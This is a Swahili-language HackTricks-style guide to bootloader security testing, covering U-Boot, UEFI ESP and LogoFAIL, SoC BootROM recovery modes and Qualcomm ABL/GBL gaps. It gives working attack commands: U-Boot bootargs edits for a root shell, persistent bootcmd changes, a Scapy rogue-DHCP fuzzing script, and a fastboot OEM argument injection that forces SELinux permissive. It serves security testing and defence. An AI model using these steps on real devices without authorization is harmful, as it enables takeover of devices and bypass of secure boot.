# Upimaji wa Bootloader

{{#include ../../banners/hacktricks-training.md}}

Hatua zifuatazo zinapendekezwa kwa kubadilisha mipangilio ya kuanzisha kifaa na kupima bootloaders kama U-Boot na loaders za daraja la UEFI. Lenga kupata utekelezaji wa msimbo mapema, tathmini ulinzi wa saini/rollback, na kunyanyasa njia za recovery au network-boot.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot quick wins and environment abuse

1. Pata interpreter shell
- Wakati wa kuanza, bonyeza kitufe kinachojulikana cha kuingilia (kwa kawaida kitufe chochote, 0, space, au mfululizo wa "magic" wa bodi) kabla `bootcmd` hajatekelezwa ili kupungua kwenye prompt ya U-Boot.

2. Chunguza hali ya boot na variables
- Amri zinazoweza kusaidia:
- `printenv` (dump environment)
- `bdinfo` (board info, memory addresses)
- `help bootm; help booti; help bootz` (supported kernel boot methods)
- `help ext4load; help fatload; help tftpboot` (available loaders)

3. Badilisha boot arguments kupata root shell
- Ongeza `init=/bin/sh` ili kernel ipungue kwenye shell badala ya init ya kawaida:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot kutoka TFTP server yako
- Sanidi mtandao na pakua kernel/fit image kutoka LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Fanya mabadiliko yaendelee kupitia environment
- Ikiwa env storage haijakingwa kwa kuandikwa, unaweza kuhifadhi udhibiti:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Angalia variables kama `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` zinazoweza kuathiri njia za fallback. Thamani zisizopangwa vizuri zinaweza kuruhusu kuingia mara kwa mara kwenye shell.

6. Angalia vipengele vya debug/unsafe
- Tafuta: `bootdelay` > 0, `autoboot` imezimwa, `usb start; fatload usb 0:1 ...` bila vizuizi, uwezo wa `loady`/`loads` kupitia serial, `env import` kutoka media isiyo ya kuaminika, na kernels/ramdisks zinapakiwa bila ukaguzi wa saini.

7. U-Boot image/verification testing
- Ikiwa jukwaa linadai secure/verified boot kwa FIT images, jaribu images zisizotiwa saini na zilizodhulumiwa:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Kutokuwepo kwa `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` au tabia ya zamani ya `verify=n` mara nyingi huruhusu kuboot payload yoyote.

## Network-boot surface (DHCP/PXE) and rogue servers

8. PXE/DHCP parameter fuzzing
- U-Boot’s legacy BOOTP/DHCP handling imekuwa na matatizo ya usalama ya kumbukumbu. Kwa mfano, CVE‑2024‑42040 inaelezea memory disclosure kupitia majibu ya DHCP yaliyotengenezwa ambayo yanaweza leak bytes kutoka kumbukumbu ya U-Boot kurudi kwenye waya. Kimbia njia za DHCP/PXE na thamani ndefu/edge-case (option 67 bootfile-name, vendor options, file/servername fields) na kulenga kwa hangs/leak.
- Mfano mdogo wa Scapy ili kuigeuza parameters za boot wakati wa netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Pia hakikisha kama uwanja wa filename wa PXE unapita kwa shell/loader logic bila kusafishwa wakati unalingana na provisioning scripts za upande wa OS.

9. Rogue DHCP server command injection testing
- Sanidi huduma ya rogue DHCP/PXE na jaribu kuingiza characters kwenye filename au fields za options ili kufikia interpreters za amri katika hatua za baadaye za boot chain. Metasploit’s DHCP auxiliary, `dnsmasq`, au scripts za Scapy maalum hutumika vizuri. Hakikisha umeweka maabara yako kwa kuwalisha tu.

## SoC ROM recovery modes that override normal boot

SoC nyingi zinaonyesha BootROM "loader" mode ambayo itakubali msimbo kupitia USB/UART hata wakati images za flash ni batili. Ikiwa fuse za secure-boot hazijateketezwa, hili linaweza kutoa utekelezaji wa msimbo yoyote mapema katika mnyororo.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Mfano: `imx-usb-loader u-boot.imx` kusukuma na kuendesha U-Boot ya desturi kutoka RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Mfano: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` au `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Mfano: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` kwa kuandaa loader na kupakia U-Boot ya desturi.

Tathmini kama kifaa kina eFuses/OTP za secure-boot zilizochomwa. Ikiwa hapana, BootROM download modes mara nyingi hupitisha chaguzi za uthibitishaji wa ngazi za juu (U-Boot, kernel, rootfs) kwa kufanya execute ya first-stage payload yako moja kwa moja kutoka SRAM/DRAM.

## UEFI/PC-class bootloaders: quick checks

10. ESP tampering and rollback testing
- Mount EFI System Partition (ESP) na angalia vipengele vya loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths.
- Jaribu kuboot kwa components zilizoporomoka (downgraded) au zilizojulikana zilizo na vunjo isipokuwa Secure Boot revocations (dbx) ziko aktuali. Ikiwa jukwaa bado linaweza kuamini shims/bootmanagers za zamani, mara nyingi unaweza kupakia kernel yako mwenyewe au `grub.cfg` kutoka ESP kupata persistence.

11. Boot logo parsing bugs (LogoFAIL class)
- Firmware za OEM/IBV zilikuwa zenye hatari kwenye parsing ya picha katika DXE zinazoshughulikia boot logos. Ikiwa mshambulizi anaweza kuweka picha iliyotengenezwa kwenye ESP chini ya path ya vendor (mfano, `\EFI\<vendor>\logo\*.bmp`) na kufanya reboot, utekelezaji wa msimbo wakati wa boot mapema unaweza kuwa uwezekano hata ukiwa na Secure Boot imezimwa. Jaribu kama jukwaa linakubali logos za watumiaji na kama hizo path zinaweza kuandikwa kutoka OS.

## Android/Qualcomm ABL + GBL (Android 16) trust gaps

Kwenye vifaa vya Android 16 vinavyotumia Qualcomm's ABL kupakia **Generic Bootloader Library (GBL)**, thibitisha kama ABL inafanya **authentication** ya UEFI app inayopakuliwa kutoka partition `efisp`. Ikiwa ABL inapima tu uwepo wa UEFI app na haitathibitishi saini, primitive ya kuandika `efisp` inakuwa **pre-OS unsigned code execution** wakati wa boot.

Ukaguzi wa vitendo na njia za kunyanyasa:

- **efisp write primitive**: Unahitaji njia ya kuandika UEFI app yako kwenye `efisp` (root/privileged service, hitilafu ya OEM app, recovery/fastboot path). Bila hili, gap ya GBL haiwezi kufikiwa moja kwa moja.
- **fastboot OEM argument injection** (ABL bug): Baadhi za builds zinakubali tokens za ziada katika `fastboot oem set-gpu-preemption` na kuziambatanisha kwenye kernel cmdline. Hii inaweza kutumika kuziba SELinux kuwa permissive, kuruhusu maandishi kwenye partitions zilizo na ulinzi:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Ikiwa kifaa kimepachikwa, amri itakata tokens za ziada.
- **Bootloader unlock via persistent flags**: Payload ya awamu ya boot inaweza kubadilisha flags za persistent unlock (mfano, `is_unlocked=1`, `is_unlocked_critical=1`) kuiga `fastboot oem unlock` bila seva ya OEM/idhini. Hii ni mabadiliko ya kudumu baada ya reboot inayofuata.

Vidokezo vya ulinzi/triage:

- Thibitisha kama ABL inafanya verification ya saini kwenye GBL/UEFI payload kutoka `efisp`. Ikiwa hapana, chukulia `efisp` kama eneo hatari kubwa kwa persistence.
- Fuata kama ABL fastboot OEM handlers zimepachikwa ili **validate argument counts** na kukataa tokens za ziada.

## Hardware caution

Kuwa mwangalifu unapoingiliana na SPI/NAND flash wakati wa boot mapema (mfano, kuunganisha pins ili kupitisha reads) na kila mara kushauriana na datasheet ya flash. Kujifunga kwa wakati si sahihi kunaweza kuharibu kifaa au programmer.

## Notes and additional tips

- Jaribu `env export -t ${loadaddr}` na `env import -t ${loadaddr}` kuhamisha environment blobs kati ya RAM na storage; baadhi ya jukwaa huruhusu kuingiza env kutoka kwenye media inayofunguka bila uthibitisho.
- Kwa persistence kwenye systems zinazotumia Linux ambazo zinaboot kupitia `extlinux.conf`, kubadilisha mstari wa `APPEND` (kuingiza `init=/bin/sh` au `rd.break`) kwenye partition ya boot mara nyingi inatosha pale hakuna ukaguzi wa saini.
- Ikiwa userland inatoa `fw_printenv/fw_setenv`, thibitisha kwamba `/etc/fw_env.config` inalingana na env storage halisi. Offsets zisizopangwa vizuri zinaweza kukuruhusu kusoma/kuandika eneo la MTD lisilo sahihi.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
{{#include ../../banners/hacktricks-training.md}}
